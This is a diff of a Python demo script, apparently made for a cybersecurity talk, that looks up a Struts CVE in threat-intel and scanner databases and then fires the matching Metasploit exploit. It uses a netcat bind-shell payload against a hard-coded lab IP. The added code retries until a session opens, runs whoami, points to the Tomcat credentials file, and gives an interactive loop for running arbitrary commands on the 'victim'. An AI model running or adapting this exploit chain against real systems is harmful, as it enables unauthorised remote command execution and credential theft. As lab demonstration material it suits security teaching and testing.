@@ -4,16 +4,16 @@ from lib.core.methods.scanners import CveScanners
 from lib.core.methods.rules import CveRules
 from lib.core.methods.exploit import CveExploit
 from metasploit.msfrpc import MsfRpcClient
+from pymisp import PyMISP
 import json
 import time
 import os
 import json
 import urllib3
-from pymisp import PyMISP
 import pprint
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
+sleep_time = 1 
 #----------------------------------------------------------------------------------------
 # setting metasploit variables
 metasploit_login = os.environ['metasploit_login_id']
@@ -22,14 +22,15 @@ payload = "cmd/unix/bind_netcat"
 remote_ip = "192.168.1.66"
 remote_port = "8080"
 target_uri = "/struts2_2.3.15.1-showcase/showcase.action"
-
+sessionid = 0
+active_shell = True
 #----------------------------------------------------------------------------------------
 # search threat intel platform for actionable intels
-misp_api_endpoint = 'http://192.168.1.38/events/index'
+misp_api_endpoint = 'http://192.168.1.136/events/index'
 misp_key = os.environ['misp_key']
 misp_verifycert = False
 relative_path = ''
-searchinfo = input("Enter a keyword you'd like to search in the Threat DB: (defaul: struts)")
+searchinfo = input("Enter a keyword you'd like to search in the Threat DB (defaul: struts): ")
 searcheventid = input("Enter EventID (optional): ")
 if not searcheventid:
     searcheventid = "1016"
@@ -38,18 +39,18 @@ misp = PyMISP(misp_api_endpoint, misp_key, misp_verifycert)
 search_results = misp.direct_call(relative_path, body)
 data = json.dumps(search_results,sort_keys=True,indent=4)
 print ("\nSearching MISP Threat Intelligence Platform for 'struts' vulnerability... ")
-time.sleep(2)
+time.sleep(sleep_time)
 print (data)
-jresults = json.loads(data)
+misp_results = json.loads(data)
 print("\nFocusing on what matters...\n")
-results = (jresults['response'][0]['info'])
+results = misp_results['response'][0]['info']
 print(results, "\n")
 
 cve = results.split('(')
 cve = cve[1]
 cve = cve.split(')')
 cve = cve[0]
-time.sleep(1)
+time.sleep(sleep_time)
 
 # ----------------------------------------------------------------------------------------
 # search through the assessment tools
@@ -61,7 +62,7 @@ else:
     quit()
     
 print ("\nSearching OpenVas DB for 'struts' associated CVEs...")
-time.sleep(1)
+time.sleep(sleep_time)
 # search openvas db
 openvas = CveScanners(cve).get_openvas()
 if openvas != "null":
@@ -78,7 +79,7 @@ else:
     quit()
 
 print ("\nSearching Nessus DB for 'struts' associated CVEs...")
-time.sleep(1)
+time.sleep(sleep_time)
 # search nessus db
 nessus = CveScanners(cve).get_nessus()
 if nessus != "null":
@@ -95,7 +96,7 @@ else:
     quit()
 
 print ("\nSearching OVAL DB for 'struts' associated CVEs...")
-time.sleep(1)
+time.sleep(sleep_time)
 # search oval db
 oval = CveScanners(cve).get_oval()
 if oval != "null":
@@ -112,7 +113,7 @@ else:
     quit()
 
 print ("\nSearching Nmap DB for 'struts' associated CVEs...")
-time.sleep(1)
+time.sleep(sleep_time)
 # search nmap db
 nmap = CveScanners(cve).get_nmap()
 if nmap != "null":
@@ -130,7 +131,7 @@ else:
     quit()
 
 print ("\nSearching Snort DB for rules to prevent 'struts' exploitation...")
-time.sleep(1)
+time.sleep(sleep_time)
 # search metasplpoit (msf) for exploits
 snort = CveRules(cve).get_snort()
 if snort != "null":
@@ -148,7 +149,7 @@ else:
     quit()
 
 print ("\nSearching Metasploit DB for related 'struts' explopits...")
-time.sleep(1)
+time.sleep(sleep_time)
 # search metasplpoit (msf) for exploits
 msf = CveExploit(cve).get_msf()
 if msf != "null":
@@ -169,29 +170,64 @@ split_msf = split_msf[1]
 split_msf = split_msf.split(".rb")
 module = split_msf[0]
 
-print ("Creating a metasploit service object...\n")
+print ("Creating a metasploit service...\n")
 # create a metasploit object
 msfrpc_obj = MsfRpcClient(metasploit_login)
 if msfrpc_obj:
     print ("Successfully created client service...")
 else:
-    print ("Something went wrong...")
+    print ("Oops! Something went wrong...")
 # create a metasploit modules object
 exploit_list = msfrpc_obj.modules.exploits
-# data = json.dumps(exploit_list)
+
 print ("starting attack on victim: ", remote_ip)
 exploit = msfrpc_obj.modules.use('exploit', exploit_module)
 exploit['RHOSTS'] = remote_ip
 exploit['RPORT'] = remote_port
 exploit['TARGETURI'] = target_uri
-
 exploit['VERBOSE']= False
 exploit.execute(payload=payload)
-# open shell to create a file in desktop
-shell = msfrpc_obj.sessions.session(1)
-shell.write('touch ~/Desktop/get.pawned\n')
-# open shell to check who current user is
-more_shell = msfrpc_obj.sessions.session(1)
-more_shell.write('whoami\n')
-print ("who am i?")
-print ("you are", more_shell.read())
+
+session_list = msfrpc_obj.sessions.list
+data = json.dumps(session_list)
+current_session = data[2:3]
+if not current_session:
+    print ("There is no Metasploit sessions...")
+    pass
+else:
+    print ("Current Metasploit sessionID: ", current_session)
+    current_session = int(current_session)
+
+while (not current_session) or (current_session == 0):
+    exploit.execute(payload=payload)
+    print ("Creating a new Metasploit session...")
+    session_list = msfrpc_obj.sessions.list
+    data = json.dumps(session_list)
+    current_session = data[2:3]
+    current_session = int(current_session)
+    print ("Metasploit sessionID: ", current_session)
+
+print ("Interactive shell's active... Quit anytime by typing 'exit'")
+if current_session >= 1:
+    sessionid = current_session
+    shell = msfrpc_obj.sessions.session(sessionid)
+    shell.write('whoami\n')
+    print ("Current user: ", shell.read())
+    print ("Tomcat Users Location: usr/local/tomcat/conf/tomcat-users.xml")
+    print ("\n")
+else:
+    print ("Oops! something went wrong! Check sessionID")
+    quit()
+
+while active_shell:
+    interactive_shell = input('Run a command against victim: ')
+    if ("exit" not in interactive_shell) or (not interactive_shell):
+        new_shell = msfrpc_obj.sessions.session(sessionid)
+        new_shell.write(interactive_shell +'\n')
+        print ("command results: ", new_shell.read())
+    else:
+        active_shell = False
+    
+print ("Exiting script now...\n")
+print ("Thank you for using Chicago CyberSecurity Demo script...")
+quit()
